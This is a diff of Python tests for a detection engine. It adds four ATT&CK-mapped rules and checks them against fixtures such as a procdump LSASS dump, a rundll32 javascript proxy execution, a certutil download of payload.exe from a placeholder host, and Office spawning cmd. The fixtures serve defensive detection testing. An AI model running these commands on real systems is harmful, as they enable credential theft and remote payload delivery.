@@ -265,9 +265,16 @@ def test_load_core_rule_pack(knowledge: AttackKnowledge) -> None:
     assert isinstance(pack, RulePack)
     assert pack.pack_id == "phase1-core-rules"
     assert len(pack.content_hash) == 64  # sha256 hex digest
-    assert len(pack.rules) == 2
+    assert len(pack.rules) == 6  # G1.0's original 2 + G1.3's 4 new rules
     rule_ids = {r.rule_ref.rule_id for r in pack.rules}
-    assert rule_ids == {"platform-encoded-powershell", "platform-interactive-logon"}
+    assert rule_ids == {
+        "platform-encoded-powershell",
+        "platform-interactive-logon",
+        "platform-procdump-lsass-dump",
+        "platform-rundll32-javascript-proxy",
+        "platform-office-spawns-cmd-shell",
+        "platform-certutil-ingress-transfer",
+    }
 
 
 def test_rule_pack_content_hash_is_reproducible(knowledge: AttackKnowledge) -> None:
@@ -1030,3 +1037,214 @@ def test_no_attribution_or_scoring_symbols_in_detection_source() -> None:
         text = path.read_text(encoding="utf-8")
         for term in forbidden_terms:
             assert term not in text, f"forbidden term {term!r} found in {path.name}"
+
+
+# ===========================================================================
+# 12. G1.3: four new rules added to the core corpus
+# ===========================================================================
+
+
+@pytest.mark.parametrize(
+    ("rule_id", "external_id"),
+    [
+        ("platform-procdump-lsass-dump", "T1003.001"),
+        ("platform-rundll32-javascript-proxy", "T1218.011"),
+        ("platform-office-spawns-cmd-shell", "T1059.003"),
+        ("platform-certutil-ingress-transfer", "T1105"),
+    ],
+)
+def test_g13_rule_carries_the_expected_validated_technique(
+    knowledge: AttackKnowledge, rule_id: str, external_id: str
+) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    rule = next(r for r in pack.rules if r.rule_ref.rule_id == rule_id)
+    assert len(rule.technique_mappings) == 1
+    mapping = rule.technique_mappings[0]
+    assert mapping.attack_ref.external_id == external_id
+    assert mapping.attack_ref.attack_kb_version == knowledge.attack_kb_version
+    assert rule.evidence_type == EvidenceType.BEHAVIORAL
+
+
+def test_g13_procdump_rule_matches_lsass_target_and_maps_to_credential_dumping(
+    knowledge: AttackKnowledge,
+) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(name="procdump.exe", command_line="procdump.exe -ma lsass.exe out.dmp"),
+    )
+    (detection,) = engine.evaluate([obs])
+    assert detection.rule_ref.rule_id == "platform-procdump-lsass-dump"
+    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
+    assert evidence.attack_ref is not None
+    assert evidence.attack_ref.external_id == "T1003.001"
+
+
+def test_g13_procdump_rule_does_not_match_non_lsass_target(knowledge: AttackKnowledge) -> None:
+    """Relevant negative: same tool, different (non-lsass) dump target --
+    proves the AND semantics require both conditions, not just the tool name."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(
+            name="procdump.exe", command_line="procdump.exe -ma notepad.exe out.dmp"
+        ),
+    )
+    assert engine.evaluate([obs]) == ()
+
+
+def test_g13_rundll32_rule_matches_javascript_proxy_pattern(knowledge: AttackKnowledge) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(
+            name="rundll32.exe",
+            command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
+        ),
+    )
+    (detection,) = engine.evaluate([obs])
+    assert detection.rule_ref.rule_id == "platform-rundll32-javascript-proxy"
+    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
+    assert evidence.attack_ref is not None
+    assert evidence.attack_ref.external_id == "T1218.011"
+
+
+def test_g13_rundll32_rule_does_not_match_benign_control_panel_invocation(
+    knowledge: AttackKnowledge,
+) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(
+            name="rundll32.exe", command_line="rundll32.exe shell32.dll,Control_RunDLL"
+        ),
+    )
+    assert engine.evaluate([obs]) == ()
+
+
+def test_g13_office_shell_rule_matches_cmd_spawned_by_word(knowledge: AttackKnowledge) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="WINWORD.EXE"))
+    (detection,) = engine.evaluate([obs])
+    assert detection.rule_ref.rule_id == "platform-office-spawns-cmd-shell"
+    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
+    assert evidence.attack_ref is not None
+    assert evidence.attack_ref.external_id == "T1059.003"
+
+
+def test_g13_office_shell_rule_matches_cmd_spawned_by_excel_too(knowledge: AttackKnowledge) -> None:
+    """The 'in' operator's second listed parent must match too, not just the first."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="EXCEL.EXE"))
+    (detection,) = engine.evaluate([obs])
+    assert detection.rule_ref.rule_id == "platform-office-spawns-cmd-shell"
+
+
+def test_g13_office_shell_rule_does_not_match_cmd_spawned_by_explorer(
+    knowledge: AttackKnowledge,
+) -> None:
+    """Relevant negative: same child process, parent not in the declared set."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs("obs-1", process=ProcessRef(name="cmd.exe", parent_name="EXPLORER.EXE"))
+    assert engine.evaluate([obs]) == ()
+
+
+def test_g13_certutil_rule_matches_urlcache_download(knowledge: AttackKnowledge) -> None:
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(
+            name="certutil.exe",
+            command_line="certutil.exe -urlcache -split -f http://example.invalid/x payload.exe",
+        ),
+    )
+    (detection,) = engine.evaluate([obs])
+    assert detection.rule_ref.rule_id == "platform-certutil-ingress-transfer"
+    (evidence,) = derive_evidence_from_detection(detection, obs, knowledge=knowledge)
+    assert evidence.attack_ref is not None
+    assert evidence.attack_ref.external_id == "T1105"
+
+
+def test_g13_certutil_rule_does_not_match_unrelated_hashfile_usage(
+    knowledge: AttackKnowledge,
+) -> None:
+    """Relevant negative: same tool, an ordinary certutil operation with no
+    download flag."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(
+            name="certutil.exe", command_line="certutil.exe -hashfile file.txt SHA256"
+        ),
+    )
+    assert engine.evaluate([obs]) == ()
+
+
+def test_g13_new_rule_detection_and_evidence_ids_embed_rule_pack_content_hash(
+    knowledge: AttackKnowledge,
+) -> None:
+    """Same proof as G1.0's identity follow-up (section 10), reapplied to one
+    of G1.3's new rules: deterministic ids, and the rule-pack content hash
+    is preserved onto Evidence.provenance.method_content_hash."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+    obs = _obs(
+        "obs-1",
+        process=ProcessRef(name="procdump.exe", command_line="procdump.exe -ma lsass.exe out.dmp"),
+    )
+
+    (detection_1,) = engine.evaluate([obs])
+    (detection_2,) = engine.evaluate([obs])
+    expected_id = f"platform-procdump-lsass-dump::1.0::{pack.content_hash}::obs-1"
+    assert detection_1.detection_id == detection_2.detection_id == expected_id
+
+    (evidence_1,) = derive_evidence_from_detection(detection_1, obs, knowledge=knowledge)
+    (evidence_2,) = derive_evidence_from_detection(detection_2, obs, knowledge=knowledge)
+    assert evidence_1.evidence_id == evidence_2.evidence_id
+    assert evidence_1.provenance.method_content_hash == pack.content_hash
+
+
+def test_g13_new_rule_with_tampered_stix_id_fails_closed(
+    tmp_path: Path, knowledge: AttackKnowledge
+) -> None:
+    """Proves the fail-closed ATT&CK validation applies to G1.3's new rules
+    specifically, not just the generic hypothetical case in section 6: take
+    the actual checked-in corpus file's content and corrupt one new rule's
+    stix_id -- the pack must not load."""
+    data = json.loads(CORE_RULES_PATH.read_text(encoding="utf-8"))
+    for rule in data["rules"]:
+        if rule["rule_id"] == "platform-procdump-lsass-dump":
+            rule["technique_mappings"][0]["stix_id"] = (
+                "attack-pattern--00000000-0000-0000-0000-000000000000"
+            )
+    path = _write(tmp_path, data)
+    with pytest.raises(DetectionError, match="does not resolve"):
+        load_rule_pack(path, knowledge=knowledge)
+
+
+def test_g13_existing_two_rules_still_behave_identically(knowledge: AttackKnowledge) -> None:
+    """The two G1.0 rules must still fire exactly as before, unaffected by
+    the four new rules appended after them in the same pack."""
+    pack = load_rule_pack(CORE_RULES_PATH, knowledge=knowledge)
+    engine = DetectionEngine(rules=pack.rules)
+
+    powershell_obs = _obs(
+        "obs-ps", process=ProcessRef(name="powershell.exe", command_line="powershell.exe -enc AAAA")
+    )
+    (ps_detection,) = engine.evaluate([powershell_obs])
+    assert ps_detection.rule_ref.rule_id == "platform-encoded-powershell"
+    assert ps_detection.technique_mappings[0].attack_ref.external_id == "T1059.001"
+
+    logon_obs = _obs("obs-logon", event=EventMetadata(action="User logon successful"))
+    (logon_detection,) = engine.evaluate([logon_obs])
+    assert logon_detection.rule_ref.rule_id == "platform-interactive-logon"
+    assert logon_detection.technique_mappings == ()
